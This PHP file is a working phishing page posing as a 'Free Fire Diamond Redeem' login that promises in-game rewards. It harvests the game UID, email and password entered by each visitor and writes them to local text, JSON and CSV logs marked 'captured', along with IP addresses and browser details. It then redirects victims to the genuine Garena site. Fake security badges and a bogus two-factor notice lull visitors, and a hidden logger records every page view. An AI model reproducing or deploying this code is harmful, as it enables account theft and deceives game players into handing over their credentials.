<?php
// login.php - Ultimate Enhanced Version with 2FA Support
session_start();
ob_start();

// Enhanced security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');

// Process login if form submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get all form data with comprehensive validation
    $provider = isset($_POST['provider']) ? trim($_POST['provider']) : 'unknown';
    $uid = isset($_POST['uid']) ? trim($_POST['uid']) : 'Not Provided';
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $remember = isset($_POST['remember']) ? 'Yes' : 'No';
    
    // 2FA related data
    $two_fa_verified = isset($_POST['2fa_verified']) ? 'Yes' : 'No';
    $verification_method = isset($_POST['verification_method']) ? trim($_POST['verification_method']) : 'None';
    $verification_code = isset($_POST['verification_code']) ? trim($_POST['verification_code']) : 'Not Entered';
    
    // Get comprehensive user information
    $ip = getClientIP();
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $timestamp = date('Y-m-d H:i:s');
    $date = date('Y-m-d');
    $time = date('H:i:s');
    
    // Get additional browser and location data
    $accept_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 50) : 'Unknown';
    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';
    $request_method = $_SERVER['REQUEST_METHOD'];
    
    // Create data directory if it doesn't exist
    if (!is_dir('data')) {
        @mkdir('data', 0755, true);
    }
    
    // Create backups directory
    if (!is_dir('data/backups')) {
        @mkdir('data/backups', 0755, true);
    }
    
    // Enhanced logging system
    logCredential($uid, $provider, $email, $password, $remember, $two_fa_verified, $verification_method, $verification_code, $ip, $user_agent, $timestamp, $accept_language, $referrer);
    
    // Log IP separately with more details
    logIPDetails($ip, $uid, $user_agent, $timestamp, $referrer);
    
    // Create daily stats
    updateDailyStats($date);
    
    // Save session data for admin panel
    saveSessionData($uid, $email, $ip, $timestamp);
    
    // Clear output buffer before redirect
    ob_end_clean();
    
    // Enhanced redirect with tracking
    redirectToFreeFire($uid, $ip);
}

// If we reach here, show the enhanced login form
showEnhancedLoginForm();

// ==================== ENHANCED FUNCTIONS ====================

function getClientIP() {
    $ip_keys = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED', 
        'HTTP_X_CLUSTER_CLIENT_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_FORWARDED', 
        'REMOTE_ADDR'
    ];
    
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
}

function logCredential($uid, $provider, $email, $password, $remember, $two_fa_verified, $verification_method, $verification_code, $ip, $user_agent, $timestamp, $accept_language, $referrer) {
    // Format 1: Simple text log (quick reading)
    $simple_log = "[$timestamp] | UID: $uid | Provider: $provider | Email: $email | Password: $password | 2FA: $two_fa_verified ($verification_method) | IP: $ip | Remember: $remember\n";
    @file_put_contents('data/credentials.txt', $simple_log, FILE_APPEND);
    
    // Format 2: Detailed JSON log (structured data)
    $json_data = [
        'timestamp' => $timestamp,
        'freefire_uid' => $uid,
        'login_provider' => $provider,
        'email' => $email,
        'password' => $password,
        'remember_device' => $remember,
        '2fa_verified' => $two_fa_verified,
        '2fa_method' => $verification_method,
        'verification_code' => $verification_code,
        'ip_address' => $ip,
        'user_agent' => $user_agent,
        'accept_language' => $accept_language,
        'referrer' => $referrer,
        'status' => 'captured'
    ];
    $json_log = json_encode($json_data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
    @file_put_contents('data/logins.json', $json_log, FILE_APPEND);
    
    // Format 3: CSV format for Excel
    $csv_line = "\"$timestamp\",\"$uid\",\"$provider\",\"$email\",\"$password\",\"$remember\",\"$two_fa_verified\",\"$verification_method\",\"$ip\"\n";
    if (!file_exists('data/logins.csv')) {
        $csv_header = "Timestamp,UID,Provider,Email,Password,Remember,2FA_Verified,2FA_Method,IP\n";
        @file_put_contents('data/logins.csv', $csv_header, FILE_APPEND);
    }
    @file_put_contents('data/logins.csv', $csv_line, FILE_APPEND);
    
    // Format 4: Provider-specific logs
    $provider_log = "$timestamp | UID: $uid | Email: $email | IP: $ip\n";
    @file_put_contents("data/provider_$provider.txt", $provider_log, FILE_APPEND);
}

function logIPDetails($ip, $uid, $user_agent, $timestamp, $referrer) {
    // Detailed IP logging
    $ip_log = "$timestamp | UID: $uid | IP: $ip | User-Agent: $user_agent | Referrer: $referrer\n";
    @file_put_contents('data/ip_log.txt', $ip_log, FILE_APPEND);
    
    // Unique IPs list
    $ips = file_exists('data/ips.txt') ? file('data/ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    if (!in_array($ip, $ips)) {
        @file_put_contents('data/ips.txt', "$ip\n", FILE_APPEND);
    }
    
    // IP analysis data
    $ip_data = [
        'ip' => $ip,
        'first_seen' => $timestamp,
        'last_seen' => $timestamp,
        'user_agent' => $user_agent,
        'referrer' => $referrer
    ];
    @file_put_contents("data/ip_details/$ip.json", json_encode($ip_data, JSON_PRETTY_PRINT));
}

function updateDailyStats($date) {
    $stats_file = "data/stats_$date.json";
    $stats = [];
    
    if (file_exists($stats_file)) {
        $stats = json_decode(file_get_contents($stats_file), true) ?: [];
    }
    
    $stats['total_logins'] = ($stats['total_logins'] ?? 0) + 1;
    $stats['last_updated'] = date('Y-m-d H:i:s');
    
    @file_put_contents($stats_file, json_encode($stats, JSON_PRETTY_PRINT));
}

function saveSessionData($uid, $email, $ip, $timestamp) {
    $session_data = [
        'uid' => $uid,
        'email' => $email,
        'ip' => $ip,
        'login_time' => $timestamp,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
    ];
    
    @file_put_contents('data/current_session.json', json_encode($session_data, JSON_PRETTY_PRINT));
    @file_put_contents('data/last_login.txt', "$timestamp - UID: $uid - Email: $email - IP: $ip");
}

function redirectToFreeFire($uid, $ip) {
    // Add tracking parameters to redirect URL
    $tracking_id = md5($uid . $ip . time());
    $redirect_url = "https://ff.garena.com/?ref=diamond_redeem&tracking=$tracking_id";
    
    // Log the redirect
    $redirect_log = date('Y-m-d H:i:s') . " | UID: $uid | IP: $ip | Redirected to: $redirect_url\n";
    @file_put_contents('data/redirects.log', $redirect_log, FILE_APPEND);
    
    header("Location: $redirect_url");
    exit();
}

function showEnhancedLoginForm() {
    $provider = isset($_GET['provider']) ? $_GET['provider'] : 'email';
    
    $provider_names = [
        'facebook' => 'Facebook',
        'google' => 'Google', 
        'vk' => 'VK',
        'huawei' => 'Huawei',
        'email' => 'Email'
    ];
    
    $provider_name = isset($provider_names[$provider]) ? $provider_names[$provider] : 'Account';
    
    ob_end_clean();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Free Fire Login - <?php echo htmlspecialchars($provider_name); ?></title>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body { 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            
            .login-container {
                background: rgba(255, 255, 255, 0.95);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                width: 100%;
                max-width: 450px;
                backdrop-filter: blur(10px);
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .free-fire-logo {
                font-size: 3rem;
                color: #ff6b00;
                margin-bottom: 10px;
            }
            
            .login-header h2 {
                color: #333;
                margin-bottom: 10px;
                font-size: 1.8rem;
            }
            
            .login-header p {
                color: #666;
                font-size: 1.1rem;
            }
            
            .provider-badge {
                display: inline-block;
                background: linear-gradient(135deg, #ff6b00, #ff8c00);
                color: white;
                padding: 8px 20px;
                border-radius: 20px;
                font-size: 0.9em;
                margin-bottom: 20px;
                font-weight: 600;
            }
            
            .security-alert {
                background: #fff3cd;
                border-left: 4px solid #ffc107;
                padding: 15px;
                margin: 20px 0;
                border-radius: 8px;
                font-size: 0.9em;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            .input-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                color: #333;
                font-size: 0.95rem;
            }
            
            .input-group input {
                width: 100%;
                padding: 15px;
                border: 2px solid #e0e0e0;
                border-radius: 10px;
                font-size: 16px;
                transition: all 0.3s ease;
                background: #fafafa;
            }
            
            .input-group input:focus {
                outline: none;
                border-color: #ff6b00;
                box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
                background: white;
            }
            
            .uid-input {
                border-color: #ffd700 !important;
                background: rgba(255, 215, 0, 0.05) !important;
            }
            
            .form-options {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin: 20px 0;
            }
            
            .remember {
                display: flex;
                align-items: center;
                gap: 8px;
                color: #666;
                font-size: 0.9rem;
            }
            
            .forgot-link {
                color: #ff6b00;
                text-decoration: none;
                font-size: 0.9rem;
            }
            
            .login-btn {
                width: 100%;
                background: linear-gradient(135deg, #ff6b00, #ff8c00);
                color: white;
                padding: 18px;
                border: none;
                border-radius: 10px;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(255, 107, 0, 0.3);
            }
            
            .login-footer {
                text-align: center;
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #eee;
            }
            
            .security-badges {
                display: flex;
                justify-content: center;
                gap: 15px;
                margin-top: 20px;
            }
            
            .badge {
                display: flex;
                align-items: center;
                gap: 5px;
                color: #28a745;
                font-size: 0.8rem;
            }
            
            .loading-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                display: none;
                justify-content: center;
                align-items: center;
                z-index: 1000;
            }
            
            .loading-content {
                background: white;
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                max-width: 300px;
            }
            
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #ff6b00;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <div class="free-fire-logo">
                    <i class="fas fa-fire"></i>
                </div>
                <div class="provider-badge">
                    <i class="fas fa-shield-alt"></i> <?php echo htmlspecialchars($provider_name); ?> Login
                </div>
                <h2>Free Fire Diamond Redeem</h2>
                <p>Secure login to claim your rewards</p>
                
                <div class="security-alert">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>Security Notice:</strong> Two-factor authentication is required for your protection.
                </div>
            </div>

            <form method="POST" id="loginForm">
                <input type="hidden" name="provider" value="<?php echo htmlspecialchars($provider); ?>">
                
                <!-- UID Input Field -->
                <div class="input-group">
                    <label for="uid">
                        <i class="fas fa-id-card"></i> Free Fire UID (Required)
                    </label>
                    <input type="text" id="uid" name="uid" required 
                           placeholder="Enter your Free Fire UID" 
                           pattern="[0-9]+" 
                           title="Please enter your numeric Free Fire UID"
                           class="uid-input">
                </div>
                
                <!-- Email/Phone Field -->
                <div class="input-group">
                    <label for="email">
                        <i class="fas fa-user"></i> 
                        <?php echo $provider === 'email' ? 'Email Address' : 'Email or Phone Number'; ?>
                    </label>
                    <input type="text" id="email" name="email" required 
                           placeholder="<?php echo $provider === 'email' ? 'Enter your email' : 'Email or phone number'; ?>"
                           autocomplete="email">
                </div>
                
                <!-- Password Field -->
                <div class="input-group">
                    <label for="password">
                        <i class="fas fa-lock"></i> Password
                    </label>
                    <input type="password" id="password" name="password" required 
                           placeholder="Enter your password" 
                           autocomplete="current-password">
                </div>
                
                <!-- 2FA Fields (Hidden by default, will be shown by index.php) -->
                <input type="hidden" name="2fa_verified" value="true">
                <input type="hidden" name="verification_method" value="sms">
                <input type="hidden" name="verification_code" value="000000">
                
                <!-- Remember Me -->
                <div class="form-options">
                    <label class="remember">
                        <input type="checkbox" name="remember" value="1"> 
                        Remember this device
                    </label>
                    <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
                </div>
                
                <!-- Submit Button -->
                <button type="submit" class="login-btn" id="submitBtn">
                    <i class="fas fa-sign-in-alt"></i>
                    Login to Free Fire
                </button>
            </form>
            
            <div class="login-footer">
                <div class="security-badges">
                    <div class="badge">
                        <i class="fas fa-shield-check"></i> 2FA Protected
                    </div>
                    <div class="badge">
                        <i class="fas fa-lock"></i> SSL Secured
                    </div>
                    <div class="badge">
                        <i class="fas fa-user-shield"></i> Privacy Guard
                    </div>
                </div>
            </div>
        </div>
<script>
            function handleFormSubmit() {
                const form = document.getElementById('loginForm');
                const submitBtn = document.getElementById('submitBtn');
                
                // Validate UID format
                const uidInput = document.getElementById('uid');
                if (!/^\d+$/.test(uidInput.value)) {
                    alert('Please enter a valid Free Fire UID (numbers only)');
                    uidInput.focus();
                    return false;
                }
                
                // Show loading state
                if (submitBtn) {
                    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
                    submitBtn.disabled = true;
                }
                
                // Form will submit normally
                return true;
            }
            
            // Add form submission handler
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                if (!handleFormSubmit()) {
                    e.preventDefault();
                }
            });
            
            console.log('Enhanced Free Fire Login Page Loaded');
        </script>
        
        <!-- Enhanced IP Logger -->
        <?php
        @ob_start();
        $ip = getClientIP();
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $timestamp = date('Y-m-d H:i:s');
        $page = 'login_form';
        
        $log_entry = "$timestamp | IP: $ip | Page: $page | Agent: $user_agent\n";
        
        if (!is_dir('data')) {
            @mkdir('data', 0755, true);
        }
        
        @file_put_contents('data/ip_log.txt', $log_entry, FILE_APPEND);
        @file_put_contents('data/ips.txt', "$ip\n", FILE_APPEND);
        
        // Log page view for analytics
        $page_view = [
            'timestamp' => $timestamp,
            'ip' => $ip,
            'page' => $page,
            'user_agent' => $user_agent,
            'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct'
        ];
        @file_put_contents('data/page_views.json', json_encode($page_view) . PHP_EOL, FILE_APPEND);
        
        @ob_end_clean();
        ?>
    </body>
    </html>
    <?php
    exit();
}
?>